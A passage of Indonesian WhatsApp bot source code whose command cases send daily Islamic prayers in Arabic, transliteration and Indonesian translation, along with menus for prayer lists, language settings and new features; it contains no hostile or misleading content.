*Arab :* اَللّٰهُمَّ بِكَ اَصْبَحْنَا وَبِكَ اَمْسَيْنَا وَبِكَ نَحْيَا وَبِكَ نَمُوْتُ وَاِلَيْكَ النُّشُوْرُ

*Latin :* Alloohumma bika ashbahnaa wa bika amsainaa wa bika nahyaa wa bika namuutu wa ilaikan nusyuuru

*Indonesia :* Ya Allah karena Engkau kami mengalami waktu pagi dan waktu petang dan karena Engkau kami hidup dan mati dan kepada-Mu juga kami akan kembali`)
limitAdd(sender, limit)
}
break
case 'doaharian14':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Menyambut Sore Hari

*Arab :* اَللّٰهُمَّ بِكَ اَمْسَيْنَا وَبِكَ اَصْبَحْنَا وَبِكَ نَحْيَا وَبِكَ نَمُوْتُ وَاِلَيْكَ الْمَصِيْرُ

*Latin :* Alloohumma bika amsainaa wa bika ashbahnaa wa bika nahyaa wa bika namuutu wa ilaikal mashiir

*Indonesia :* Ya Allah karena Engkau kami mengalami waktu petang dan waktu pagi karena Engkau kami hidup dan mati dan kepada-Mu juga kami akan kembali`)
limitAdd(sender, limit)
}
break
case 'doaharian15':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Ketika Bercermin

*Arab :* اَلْحَمْدُ ِللهِ كَمَا حَسَّنْتَ خَلْقِىْفَحَسِّـنْ خُلُقِىْ

*Latin :* Alhamdulillaahi kamaa hassanta kholqii fahassin khuluqii

*Indonesia :* Segala puji bagi Allah baguskanlah budi pekertiku sebagaimana Engkau telah membaguskan rupa wajahku`)
limitAdd(sender, limit)
}
break
case 'doaharian16':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Masuk Rumah

*Arab :* اَللّٰهُمَّ اِنّىْ اَسْأَلُكَ خَيْرَالْمَوْلِجِ وَخَيْرَالْمَخْرَجِ بِسْمِ اللهِ وَلَجْنَا وَبِسْمِ اللهِ خَرَجْنَا وَعَلَى اللهِ رَبّنَا تَوَكَّلْنَا

*Latin :* Allahumma innii as-aluka khoirol mauliji wa khoirol makhroji bismillaahi wa lajnaa wa bismillaahi khorojnaa wa'alallohi robbina tawakkalnaa

*Indonesia :* Ya Allah sesungguhnya aku mohon kepada-Mu baiknya tempat masuk dan baiknya tempat keluar dengan menyebut nama Allah kami masuk dan dengan menyebut nama Allah kami keluar dan kepada Allah Tuhan kami kami bertawakkal`)
limitAdd(sender, limit)
}
break
case 'doaharian17':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Keluar Rumah / Doa Bepergian

*Arab :* بِسْمِ اللهِ تَوَكَّلْتُ عَلَى اللهِ لاَحَوْلَ وَلاَقُوَّةَ اِلاَّ بِالله

*Latin :* Bismillaahi tawakkaltu 'alalloohi laa hawlaa walaa quwwata illaa bilaahi

*Indonesia :* Dengan menyebut nama Allah aku bertawakal kepada Allah tiada daya kekuatan melainkan dengan pertologan Allah`)
limitAdd(sender, limit)
}
break
case 'doaharian18':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Memakai Pakaian

*Arab :* بِسْمِ اللهِ اَللّٰهُمَّ اِنِّى اَسْأَلُكَ مِنْ خَيْرِهِ وَخَيْرِ مَاهُوَ لَهُ وَاَعُوْذُبِكَ مِنْ شَرِّهِ وَشَرِّمَا هُوَلَهُ

*Latin :* Bismillaahi Alloohumma innii as-aluka min khoirihi wa khoiri maa huwa lahuu wa'a'uu dzubika min syarrihi wa syarri maa huwa lahuu

*Indonesia :* Dengan nama-Mu yaa Allah akku minta kepada Engkau kebaikan pakaian ini dan kebaikan apa yang ada padanya dan aku berlindung kepada Engkau dari kejahatan pakaian ini dan kejahatan yang ada padanya`)
limitAdd(sender, limit)
}
break
case 'doaharian19':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Memakai Pakaian Baru

*Arab :* اَلْحَمْدُ لِلّٰهِ الَّذِىْ كَسَانِىْ هَذَا وَرَزَقَنِيْهِ مِنْ غَيْرِ حَوْلٍ مِنِّىْ وَلاَقُوَّةٍ

*Latin :* Alhamdu lillaahil ladzii kasaanii haadzaa wa rozaqoniihi min ghoiri hawlim minni wa laa quwwatin

*Indonesia :* Segala puji bagi Allah yang memberi aku pakaian ini dan memberi rizeki dengan tiada upaya dan kekuatan dariku`)
limitAdd(sender, limit)
}
break
case 'doaharian20':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Melepas Pakaian

*Arab :* بِسْمِ اللهِ الَّذِيْ لاَ إِلَهَ إِلَّا هُوَ

*Latin :* Bismillaahil ladzii laa ilaaha illaa huwa

*Indonesia :* Dengan nama Allah yang tiada Tuhan selain-Nya`)
limitAdd(sender, limit)
}
break
case 'doaharian21':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Memohon Ilmu Yang Bermanfaat

*Arab :* اَللّٰهُمَّ اِنِّى اَسْأَلُكَ عِلْمًا نَافِعًا وَرِزْقًا طَيِّبًا وَعَمَلاً مُتَقَبَّلاً

*Latin :* Alloohumma innii as-aluka 'ilmaan naafi'aan wa rizqoon thoyyibaan wa 'amalaan mutaqobbalaan

*Indonesia :* Ya Allah sesungguhnya aku mohon kepada-Mu ilmu yang berguna rezki yang baik dan amal yang baik Diterima. (H.R. Ibnu Majah)`)
limitAdd(sender, limit)
}
break
case 'doaharian22':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Sebelum Belajar

*Arab :* يَارَبِّ زِدْنِىْ عِلْمًا وَارْزُقْنِىْ فَهْمًا

*Latin :* Yaa robbi zidnii 'ilman warzuqnii fahmaa

*Indonesia :* Ya Allah tambahkanlah aku ilmu dan berikanlah aku rizqi akan kepahaman`)
limitAdd(sender, limit)
}
break
case 'doaharian23':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Sesudah Belajar

*Arab :* اَللّٰهُمَّ اِنِّى اِسْتَوْدِعُكَ مَاعَلَّمْتَنِيْهِ فَارْدُدْهُ اِلَىَّ عِنْدَ حَاجَتِىْ وَلاَ تَنْسَنِيْهِ يَارَبَّ الْعَالَمِيْنَ

*Latin :* Allaahumma innii astaudi'uka maa 'allamtaniihi fardud-hu ilayya 'inda haajatii wa laa tansaniihi yaa robbal 'alamiin

*Indonesia :* Ya Allah sesungguhnya aku menitipkan kepada Engkau ilmu-ilmu yang telah Engkau ajarkan kepadaku dan kembalikanlah kepadaku sewaktu aku butuh kembali dan janganlah Engkau lupakan aku kepada ilmu itu wahai Tuhan seru sekalian alam`)
limitAdd(sender, limit)
}
break
case 'doaharian24':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Berpergian

*Arab :* اَللّٰهُمَّ هَوِّنْ عَلَيْنَا سَفَرَنَا هَذَا وَاطْوِعَنَّابُعْدَهُ اَللّٰهُمَّ اَنْتَ الصَّاحِبُ فِى السَّفَرِوَالْخَلِيْفَةُفِى الْاَهْلِ

*Latin :* Alloohumma hawwin 'alainaa safaranaa hadzaa waatwi 'annaa bu'dahu. Alloohumma antashookhibu fiissafari walkholiifatu fiil ahli

*Indonesia :* Ya Allah mudahkanlah kami berpergian ini dan dekatkanlah kejauhannya. Ya Allah yang menemani dalam berpergian dan Engkau pula yang melindungi keluarga`)
limitAdd(sender, limit)
}
break
case 'doaharian25':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Naik Kendaraan

*Arab :* سُبْحَانَ الَّذِىْ سَخَّرَلَنَا هَذَا وَمَاكُنَّالَهُ مُقْرِنِيْنَ وَاِنَّآ اِلَى رَبِّنَا لَمُنْقَلِبُوْنَ

*Latin :* Subhaanalladzii sakkhara lanaa hadza wama kunna lahu muqriniin wa-inna ilaa rabbina lamunqalibuun.

*Indonesia :* Maha suci Allah yang telah menundukkan untuk kami (kendaraan) ini. padahal sebelumnya kami tidak mampu untuk menguasainya dan hanya kepada-Mu lah kami akan kembali`)
limitAdd(sender, limit)
}
break
case 'doaharian26':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Naik Kapal

*Arab :* بِسْمِ اللهِ مَجْرَهَا وَمُرْسَهَآاِنَّ رَبِّىْ لَغَفُوْرٌرَّحِيْمٌ

*Latin :* Bismillaahi majrahaa wa mursaahaa inna robbii laghofuurur rohiim

*Indonesia :* Dengan nama Allah yang menjalankan kendaraan ini berlayar dan berlabuh sesungguhnya Tuhanku benar-benar Maha Pengampun lagi Maha Penyayang`)
limitAdd(sender, limit)
}
break
case 'doaharian27':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Ketika Sampai di Tempat Tujuan

*Arab :* اَلْحَمْدُ ِللهِ الَّذِى سَلَمَنِى وَالَّذِى اَوَنِى وَالَّذِى جَمَعَ الشَّمْلَ بِ

*Latin :* Alhamdulillahil ladzi sallamani wal ladzi awani wal ladzi jama’asy syamla bi

*Indonesia :* Segala puji bagi Allah yang telah menyelamatkan akau dan yang telah melindungiku dan yang mengumpulkanku dengan keluargaku`)
limitAdd(sender, limit)
}
break
case 'doaharian28':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Ketika Menuju Masjid

*Arab :* اَللّٰهُمَّ اجْعَلْ فِىْ قَلْبِى نُوْرًا وَفِى لِسَانِىْ نُوْرًا وَفِىْ بَصَرِىْ نُوْرًا وَفِىْ سَمْعِىْ نُوْرًا وَعَنْ يَسَارِىْ نُوْرًا وَعَنْ يَمِيْنِىْ نُوْرًا وَفَوْقِىْ نُوْرًا وَتَحْتِىْ نُوْرًا وَاَمَامِىْ نُوْرًا وَخَلْفِىْ نُوْرًا وَاجْعَلْ لِّىْ نُوْرًا

*Latin :* Alloohummaj-'al fii qolbhii nuuroon wa fii lisaanii nuuroon wa fii bashorii nuuroon wa fii sam'ii nuuroon wa'an yamiinii nuuroon wa'an yasaarii nuuroon wa fauqii nuuroo wa tahtii nuuroo wa amaamii nuuroon wa khofii nuuroon waj-'al lii nuuroon

*Indonesia :* Ya Allah jadikanlah dihatiku cahaya pada lisanku cahaya dipandanganku cahaya dalam pendengaranku cahaya dari kananku cahaya dari kiriku cahaya dari atasku cahaya dari bawahku cahaya dari depanku cahaya belakangku cahaya dan jadikanlah untukku cahaya (H.R. Bukhari dan Muslim)`)
limitAdd(sender, limit)
}
break
case 'doaharian29':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Masuk Masjid

*Arab :* اَللّٰهُمَّ افْتَحْ لِيْ اَبْوَابَ رَحْمَتِكَ

*Latin :* Allahummaf tahlii abwaaba rohmatik

*Indonesia :* Ya Allah bukalah untukku pintu-pintu rahmat-Mu`)
limitAdd(sender, limit)
}
break
case 'doaharian30':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Keluar Masjid

*Arab :* اَللّٰهُمَّ اِنِّى اَسْأَلُكَ مِنْ فَضْلِكَ

*Latin :* Allahumma innii asaluka min fadlik

*Indonesia :* Ya Allah sesungguhnya aku memohon keutamaan dari-Mu`)
limitAdd(sender, limit)
}
break
case 'doaharian31':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Akan Membaca Al-Qur'an

*Arab :* اَللّٰهُمَّ افْتَحْ عَلَىَّ حِكْمَتَكَ وَانْشُرْ عَلَىَّ رَحْمَتَكَ وَذَكِّرْنِىْ مَانَسِيْتُ يَاذَاالْجَلاَلِ وَاْلاِكْرَامِ

*Latin :* Alloohummaftah 'alayya hikmataka wansyur 'alayya rohmataka wa dzakkirnii maanasiitu yaa dzal jalaali wal ikhroomi

*Indonesia :* Ya Allah bukakanlah hikmahMu padaku bentangkanlah rahmatMu padaku dan ingatkanlah aku terhadap apa yang aku lupa wahai Dzat yang memiliki keagungan dan kemuliaan`)
limitAdd(sender, limit)
}
break
case 'doaharian32':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Setelah Membaca Al-Qur'an

*Arab :* اَللّٰهُمَّ ارْحَمْنِىْ بِالْقُرْآنِ. وَاجْعَلْهُ لِىْ اِمَامًا وَنُوْرًا وَّهُدًى وَّرَحْمَةً. اَللّٰهُمَّ ذَكِّرْنِىْ مِنْهُ مَانَسِيْتُ وَعَلِّمْنِىْ مِنْهُ مَاجَهِلْتُ. وَارْزُقْنِىْ تِلاَ وَتَهُ آنَآءَ اللَّيْلِ وَاَطْرَافَ النَّهَارٍ. وَاجْعَلْهُ لِىْ حُجَّةً يَارَبَّ الْعَالَمِيْنَ

*Latin :* Allahummarhamnii bil qur'aani. waj'alhu lii imaaman wa nuuran wa hudan wa rohman. Allahumma dzakkirnii minhu maa nasiitu wa'allimnii minhu maa jahiltu. wazuqnii tilaa watahu aanaa-al laili wa athroofan nahaari. waj'alhu lii hujjatan yaa robbal 'aalamiina.

*Indonesia :* Ya Allah rahmatilah aku dengan Al-Quran yang agung jadikanlah ia bagiku ikutan cahaya petunjuk rahmat. Ya Allah ingatkanlah apa yang telah aku lupa dan ajarkan kepadaku apa yang tidak aku ketahui darinya anugerahkanlah padaku kesempatan membacanya pada sebagian malam dan siang jadikanlah ia hujjah yang kuat bagiku wahai Tuhan seru sekalian alam`)
limitAdd(sender, limit)
}
break
case 'doaharian33':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Niat Wudhu

*Arab :* نَوَيْتُ الْوُضُوْءَ لِرَفْعِ الْحَدَثِ اْلاَصْغَرِ فَرْضًا لِلّٰهِ تَعَالَى

*Latin :* Nawaitul whudu-a lirof'il hadatsii ashghori fardhon lillaahi ta'aalaa

*Indonesia :* Saya niat berwudhu untuk menghilangkan hadast kecil fardu (wajib) karena Allah ta'ala`)
limitAdd(sender, limit)
}
break
case 'doaharian34':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Setelah Wudhu

*Arab :* اَشْهَدُ اَنْ لاَّاِلَهَ اِلاَّاللهُ وَحْدَهُ لاَشَرِيْكَ لَهُ وَاَشْهَدُ اَنَّ مُحَمَّدًاعَبْدُهُ وَرَسُوْلُهُ. اَللّٰهُمَّ اجْعَلْنِىْ مِنَ التَّوَّابِيْنَ وَاجْعَلْنِىْ مِنَ الْمُتَطَهِّرِيْنَ، وَجْعَلْنِيْ مِنْ عِبَادِكَ الصَّالِحِيْنَ

*Latin :* Asyhadu allaa ilaaha illalloohu wahdahuu laa syariika lahu wa asyhadu anna muhammadan ‘abduhuuwa rosuuluhuu alloohummaj’alnii minat tawwaabiina waj’alnii minal mutathohhiriina waj'alnii min 'ibadikash shaalihiina

*Indonesia :* Aku bersaksi tidak ada Tuhan selain Allah Yang Maha Esa tidak ada sekutu bagi-Nya dan aku mengaku bahwa Nabi Muhammad itu adalah hamba dan Utusan Allah. Ya Allah jadikanlah aku dari golongan orang-orang yang bertaubat dan jadikanlah aku dari golongan orang-orang yang suci dan jadikanlah aku dari golongan hamba-hamba Mu yang shaleh`)
limitAdd(sender, limit)
}
break
case 'doaharian35':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa akan Mandi

*Arab :* اَللّٰهُمَّ اغْفِرْلِى ذَنْبِى وَوَسِّعْ لِى فِىْ دَارِىْ وَبَارِكْ لِىْ فِىْ رِزْقِىْ

*Latin :* Alloohummaghfirlii dzambii wa wassi'lii fii daarii wa baarik lii fii rizqii

*Indonesia :* Ya Allah ampunilah dosa kesalahanku dan berilah keluasaan di rumahku serta berkahilah pada rezekiku`)
limitAdd(sender, limit)
}
break
case 'doaharian36':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Terhindar Dari Penyakit

*Arab :* اللَّهُمَّ إِنِّى أَعُوذُ بِكَ مِنْ زَوَالِ نِعْمَتِكَ وَتَحَوُّلِ عَافِيَتِكَ وَفُجَاءَةِ نِقْمَتِكَ وَجَمِيعِ سَخَطِكَ

*Latin :* Alloohumma innii a’uudzu bika min zawaali ni’matik, wa tahawwulat 'aafiyat, wa fujaa ati niqmat, wa jamii’i sakhothik

*Indonesia :* Ya Allah, sesungguhnya aku berlindung kepadamu dari hilangnya nikmat yang telah engkau berikan, dari berubahnya kesehatan yang telah engkau anugerahkan, dari siksa mu yang datang secara tiba-tiba dan segala kemurkaanmu (H.R. Muslim No 2739)`)
}
break
case 'listdoaharian':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
mentions(`${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *LIST DOA HARIAN* ❭
│➪ Doa Sebelum Makan
│ doaharian1
│➪ Doa Sesudah Makan
│ doaharian2
│➪ Doa SesudahMinum
│ doaharian3
│➪ Doa Ketika Makan Lupa Membaca Doa
│ doaharian4
│➪ Doa Sebelum Tidur
│ doaharian5
│➪ Doa Ketika Mimpi Buruk
│ doaharian6
│➪ Doa Ketika Mendapat Mimpi Baik
│ doaharian7
│➪ Doa Masuk Kamar Mandi Atau Toilet
│ doaharian8
│➪ Doa Bangun Tidur
│ doaharian9
│➪ Doa Istinja
│ doaharian10
│➪ Doa Keluar Kamar Mandi Atau Toilet
│ doaharian11
│➪ Doa Keluar Kamar Mandi Atau Toilet
│ doaharian12
│➪ Doa Menjelang Sholat Shubuh
│ doaharian13
│➪ Doa Menyambut Pagi hari
│ doaharian14
│➪ Doa Menyambut Sore Hari
│ doaharian15
│➪ Doa Ketika Bercermin
│ doaharian16
│➪ Doa Masuk Rumah
│ doaharian17
│➪ Doa Keluar Rumah / Doa Bepergian
│ doaharian18
│➪ Doa Memakai Pakaian
│ doaharian19
│➪ Doa Memakai Pakaian Baru
│ doaharian20
│➪ Doa Melepas Pakaian
│ doaharian21
│➪ Doa Memohon Ilmu Yang Bermanfaat
│ doaharian22
│➪ Doa Sebelum Belajar
│ doaharian23
│➪ Doa Sesudah Belajar
│ doaharian24
│➪ Doa Berpergian
│ doaharian25
│➪ Doa Naik Kendaraan
│ doaharian26
│➪ Doa Naik Kapal
│ doaharian27
│➪ Doa Ketika Sampai di Tempat Tujuan
│ doaharian28
│➪ Doa Ketika Menuju Masjid
│ doaharian29
│➪ Doa Masuk Masjid
│ doaharian30
│➪ Doa Keluar Masjid
│ doaharian31
│➪ Doa Akan Membaca Al-Qur'an
│ doaharian32
│➪ Doa Setelah Membaca Al-Qur'an
│ doaharian33
│➪ Doa Setelah Wudhu 
│ doaharian34
│➪ Doa akan Mandi 
│ doaharian35
│➪ Doa Terhindar Dari Penyakit
│ doaharian36
└─────────────────`, [sender], true)
}
break

case 'q': 
if (!m.quoted) return reply('reply pesan!')
let qse = surya.serializeM(await m.getQuotedObj())
if (!qse.quoted) return reply('pesan yang anda reply tidak mengandung reply!')
await qse.quoted.copyNForward(m.chat, true)

case 'setlangid':
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
mess = indonesia
reply('Sukses mengubah bahasa ke indonesia')
break

case 'setlangen':
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
mess = inggris
reply('Success changing language to english')
break

case 'setlangmy':
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
mess = malaysia
reply('Berjaya menukar bahasa ke malaysia')
break

case 'setlangja':
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
mess = jepang
reply('言語をマレーシアに変更することに成功しました')
break

case 'setbahasa':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
let tmhm = moment(msg.messageTimestamp * 1000).format('HH:mm:ss')
const listLang = {
buttonText: '𝐊𝐥𝐢𝐤 𝐃𝐢𝐬𝐢𝐧𝐢 ︎🌹',
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
description: `Hai kak @${sender.split('@')[0]}, ${Ucapan}\n\n${sholat}\nSilahkan pilih bahasa disini 🌹\n`,
sections: [
{
"title": `${tmhm} - ${tampilBulan}`,
rows: [
{
"title": "Indonesia",
"rowId": `${prefix}setlangid`
},
{
"title": "English",
"rowId": `${prefix}setlangen`
},
{
"title": "Malaysia",
"rowId": `${prefix}setlangmy`
},
{
"title": "Jepang",
"rowId": `${prefix}setlangja`
}
]
}],
listType: 1
}
surya.sendMessage(from, listLang, MessageType.listMessage, {contextInfo: { mentionedJid: [sender, Suryaa, '0@s.whatsapp.net']}, quoted:fkontak})
break

case 'creatormecha':
if (isMuted) return
if (isBan) return 
surya.sendContact(from, '62895415497664@s.whatsapp.net.split("@")', 'ᴹᴿ᭄𝑺𝒖𝒓𝒚𝒂ㄙ×፝֟͜×⁩', msg)
break

case 'fiturbaru':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
let textfitur = `${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❬━━━━━━❭
│ _*• ${wib}*_
│ _*• ${wit}*_
│ _*• ${wita}*_
│ _*• Tanggal : ${tampilBulan}*_
│ _*• Tanggal Islam : ${dateIslamic}*_
└─────────────────

╭━━❬ *FITUR BARU* ❭
│${revatod} ${prefix}pantun3
│${revatod} ${prefix}tongue
│${revatod} ${prefix}cerpen2
│${revatod} ${prefix}cersex
│${revatod} ${prefix}jsholat daerah
│${revatod} ${prefix}asupansantuy
│${revatod} ${prefix}asupanukhty
│${revatod} ${prefix}asupanghea
│${revatod} ${prefix}asupanrikagusriani
│${revatod} ${prefix}memegen teks|teks|reply foto
│${revatod} ${prefix}toimgbb [reply foto]
└─────────────────`
let fitur = await getBuffer(`https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Fitur Baru`)
let fitu = await surya.prepareMessage(from, fitur, location, {thumbnail: fitur})
const buttons = [{buttonId: 'creatormecha', buttonText: {displayText: 'Creator bot'}, type: 1},
{buttonId: 'donasi', buttonText: {displayText: 'Donasi'}, type: 1}]
const buttonsMessage = {
locationMessage: fitu.message.locationMessage,
contentText: textfitur,
